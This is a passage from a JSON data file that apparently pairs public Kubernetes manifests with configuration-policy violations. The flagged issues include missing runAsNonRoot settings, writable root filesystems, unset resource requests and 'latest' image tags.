    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tensorflow-predictor\" does not have a read-only root file system"
  },
  {
    "id": "04069",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tensorflow-serving-cpu\" does not have a read-only root file system"
  },
  {
    "id": "04070",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"downloader\" is not set to runAsNonRoot"
  },
  {
    "id": "04071",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"python-predictor-cpu\" is not set to runAsNonRoot"
  },
  {
    "id": "04072",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tensorflow-predictor\" is not set to runAsNonRoot"
  },
  {
    "id": "04073",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tensorflow-serving-cpu\" is not set to runAsNonRoot"
  },
  {
    "id": "04074",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"downloader\" has cpu request 0"
  },
  {
    "id": "04075",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"python-predictor-cpu\" has cpu request 0"
  },
  {
    "id": "04076",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tensorflow-predictor\" has cpu request 0"
  },
  {
    "id": "04077",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tensorflow-serving-cpu\" has cpu request 0"
  },
  {
    "id": "04078",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"downloader\" has memory limit 0"
  },
  {
    "id": "04079",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"python-predictor-cpu\" has memory limit 0"
  },
  {
    "id": "04080",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tensorflow-predictor\" has memory limit 0"
  },
  {
    "id": "04081",
    "manifest_path": "data/manifests/the_stack_sample/sample_1838.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: image-downloader\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      name: image-downloader\n  template:\n    metadata:\n      labels:\n        name: image-downloader\n    spec:\n      containers:\n      - name: python-predictor-cpu\n        image: $CORTEX_IMAGE_PYTHON_PREDICTOR_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-serving-cpu\n        image: $CORTEX_IMAGE_TENSORFLOW_SERVING_CPU\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: tensorflow-predictor\n        image: $CORTEX_IMAGE_TENSORFLOW_PREDICTOR\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n      - name: downloader\n        image: $CORTEX_IMAGE_DOWNLOADER\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - sleep 1000000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tensorflow-serving-cpu\" has memory limit 0"
  },
  {
    "id": "04082",
    "manifest_path": "data/manifests/the_stack_sample/sample_1840.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: yeah-it-works\nspec:\n  template:\n    spec:\n      containers:\n      - name: yeah-it-works\n        image: python:3.6-alpine\n        command:\n        - python\n        - -c\n        - print('Yeah, it works in a Job!!!')\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"yeah-it-works\" does not have a read-only root file system"
  },
  {
    "id": "04083",
    "manifest_path": "data/manifests/the_stack_sample/sample_1840.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: yeah-it-works\nspec:\n  template:\n    spec:\n      containers:\n      - name: yeah-it-works\n        image: python:3.6-alpine\n        command:\n        - python\n        - -c\n        - print('Yeah, it works in a Job!!!')\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"yeah-it-works\" is not set to runAsNonRoot"
  },
  {
    "id": "04084",
    "manifest_path": "data/manifests/the_stack_sample/sample_1840.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: yeah-it-works\nspec:\n  template:\n    spec:\n      containers:\n      - name: yeah-it-works\n        image: python:3.6-alpine\n        command:\n        - python\n        - -c\n        - print('Yeah, it works in a Job!!!')\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"yeah-it-works\" has cpu request 0"
  },
  {
    "id": "04085",
    "manifest_path": "data/manifests/the_stack_sample/sample_1840.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: yeah-it-works\nspec:\n  template:\n    spec:\n      containers:\n      - name: yeah-it-works\n        image: python:3.6-alpine\n        command:\n        - python\n        - -c\n        - print('Yeah, it works in a Job!!!')\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"yeah-it-works\" has memory limit 0"
  },
  {
    "id": "04086",
    "manifest_path": "data/manifests/the_stack_sample/sample_1844.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: modeldb\n  name: modeldb-artifact-store\nspec:\n  selector:\n    matchLabels:\n      app: modeldb\n      tier: artifact-store\n  template:\n    metadata:\n      labels:\n        app: modeldb\n        tier: artifact-store\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - env:\n        - name: VERTA_ARTIFACT_CONFIG\n          value: /config/config.yaml\n        image: vertaaiofficial/modeldb-artifact-store:kubeflow\n        imagePullPolicy: Always\n        name: modeldb-artifact-store\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - mountPath: /config\n          name: modeldb-artifact-store-config\n          readOnly: true\n      volumes:\n      - configMap:\n          name: modeldb-artifact-store-config\n        name: modeldb-artifact-store-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"modeldb-artifact-store\" does not have a read-only root file system"
  },
  {
    "id": "04087",
    "manifest_path": "data/manifests/the_stack_sample/sample_1844.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: modeldb\n  name: modeldb-artifact-store\nspec:\n  selector:\n    matchLabels:\n      app: modeldb\n      tier: artifact-store\n  template:\n    metadata:\n      labels:\n        app: modeldb\n        tier: artifact-store\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - env:\n        - name: VERTA_ARTIFACT_CONFIG\n          value: /config/config.yaml\n        image: vertaaiofficial/modeldb-artifact-store:kubeflow\n        imagePullPolicy: Always\n        name: modeldb-artifact-store\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - mountPath: /config\n          name: modeldb-artifact-store-config\n          readOnly: true\n      volumes:\n      - configMap:\n          name: modeldb-artifact-store-config\n        name: modeldb-artifact-store-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"modeldb-artifact-store\" is not set to runAsNonRoot"
  },
  {
    "id": "04088",
    "manifest_path": "data/manifests/the_stack_sample/sample_1844.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: modeldb\n  name: modeldb-artifact-store\nspec:\n  selector:\n    matchLabels:\n      app: modeldb\n      tier: artifact-store\n  template:\n    metadata:\n      labels:\n        app: modeldb\n        tier: artifact-store\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - env:\n        - name: VERTA_ARTIFACT_CONFIG\n          value: /config/config.yaml\n        image: vertaaiofficial/modeldb-artifact-store:kubeflow\n        imagePullPolicy: Always\n        name: modeldb-artifact-store\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - mountPath: /config\n          name: modeldb-artifact-store-config\n          readOnly: true\n      volumes:\n      - configMap:\n          name: modeldb-artifact-store-config\n        name: modeldb-artifact-store-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"modeldb-artifact-store\" has cpu request 0"
  },
  {
    "id": "04089",
    "manifest_path": "data/manifests/the_stack_sample/sample_1844.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: modeldb\n  name: modeldb-artifact-store\nspec:\n  selector:\n    matchLabels:\n      app: modeldb\n      tier: artifact-store\n  template:\n    metadata:\n      labels:\n        app: modeldb\n        tier: artifact-store\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - env:\n        - name: VERTA_ARTIFACT_CONFIG\n          value: /config/config.yaml\n        image: vertaaiofficial/modeldb-artifact-store:kubeflow\n        imagePullPolicy: Always\n        name: modeldb-artifact-store\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - mountPath: /config\n          name: modeldb-artifact-store-config\n          readOnly: true\n      volumes:\n      - configMap:\n          name: modeldb-artifact-store-config\n        name: modeldb-artifact-store-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"modeldb-artifact-store\" has memory limit 0"
  },
  {
    "id": "04090",
    "manifest_path": "data/manifests/the_stack_sample/sample_1853.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: compliance-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: compliance-operator\n  template:\n    metadata:\n      labels:\n        name: compliance-operator\n      annotations:\n        workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n    spec:\n      serviceAccountName: compliance-operator\n      containers:\n      - name: compliance-operator\n        image: quay.io/compliance-operator/compliance-operator:latest\n        command:\n        - compliance-operator\n        - operator\n        imagePullPolicy: Always\n        securityContext:\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n          limits:\n            memory: 200Mi\n            cpu: 100m\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: compliance-operator\n        - name: RELATED_IMAGE_OPENSCAP\n          value: quay.io/compliance-operator/openscap-ocp:1.3.5\n        - name: RELATED_IMAGE_OPERATOR\n          value: quay.io/compliance-operator/compliance-operator:latest\n        - name: RELATED_IMAGE_PROFILE\n          value: quay.io/complianceascode/ocp4:latest\n        volumeMounts:\n        - name: serving-cert\n          mountPath: /var/run/secrets/serving-cert\n          readOnly: true\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: compliance-operator-serving-cert\n          optional: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"compliance-operator\" is using an invalid container image, \"quay.io/compliance-operator/compliance-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04091",
    "manifest_path": "data/manifests/the_stack_sample/sample_1853.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: compliance-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: compliance-operator\n  template:\n    metadata:\n      labels:\n        name: compliance-operator\n      annotations:\n        workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n    spec:\n      serviceAccountName: compliance-operator\n      containers:\n      - name: compliance-operator\n        image: quay.io/compliance-operator/compliance-operator:latest\n        command:\n        - compliance-operator\n        - operator\n        imagePullPolicy: Always\n        securityContext:\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n          limits:\n            memory: 200Mi\n            cpu: 100m\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: compliance-operator\n        - name: RELATED_IMAGE_OPENSCAP\n          value: quay.io/compliance-operator/openscap-ocp:1.3.5\n        - name: RELATED_IMAGE_OPERATOR\n          value: quay.io/compliance-operator/compliance-operator:latest\n        - name: RELATED_IMAGE_PROFILE\n          value: quay.io/complianceascode/ocp4:latest\n        volumeMounts:\n        - name: serving-cert\n          mountPath: /var/run/secrets/serving-cert\n          readOnly: true\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: compliance-operator-serving-cert\n          optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"compliance-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "04092",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cinder-csi-plugin\" is using an invalid container image, \"docker.io/k8scloudprovider/cinder-csi-plugin:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04093",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: 